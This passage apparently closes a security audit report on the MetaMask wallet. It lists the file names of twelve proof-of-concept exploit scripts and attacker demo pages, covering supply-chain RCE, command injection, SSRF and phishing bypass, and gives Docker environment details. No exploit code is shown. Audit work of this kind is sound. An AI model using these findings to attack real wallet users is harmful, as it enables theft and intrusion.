| `setup.sh`                                   | Docker environment bootstrap       |
| `teardown.sh`                                | Cleanup                            |
| `run_all_exploits.sh`                        | Sequential exploit runner          |
| `exploits/vuln1_supply_chain_rce.sh`         | VULN-1 automated PoC               |
| `exploits/mock_skills_server/setup_mock_repo.sh` | VULN-1 mock repo helper        |
| `exploits/vuln2_extension_id_leak.sh`        | VULN-2 automated PoC               |
| `exploits/vuln2_exploit_page.html`           | VULN-2 attacker page demo          |
| `exploits/vuln3_trezor_message_injection.sh` | VULN-3 automated PoC               |
| `exploits/vuln3_exploit_page.html`           | VULN-3 attacker page demo          |
| `exploits/vuln4_command_injection.sh`        | VULN-4 automated PoC               |
| `exploits/vuln5_backup_restore_hijack.sh`    | VULN-5 automated PoC               |
| `exploits/vuln6_snap_websocket_bypass.sh`    | VULN-6 automated PoC               |
| `exploits/vuln7_watchasset_tracking.sh`      | VULN-7 automated PoC               |
| `exploits/vuln8_caip_phishing_bypass.sh`     | VULN-8 automated PoC               |
| `exploits/vuln9_ppom_siwe_bypass.sh`         | VULN-9 automated PoC               |
| `exploits/vuln10_ens_zeronet_ssrf.sh`        | VULN-10 automated PoC              |
| `exploits/vuln11_snap_svg_injection.sh`      | VULN-11 automated PoC              |
| `exploits/vuln12_ipfs_gateway_loopback.sh`   | VULN-12 automated PoC              |

## Appendix: Docker Environment

- Image: `node:22-bookworm@sha256:1031993481795705055273f2eef0c24597abdcb277d6e058c82f78cbbdef92a6`
- Container name: `metamask-audit`
- All exploit scripts are idempotent and can be re-run after `setup.sh`.
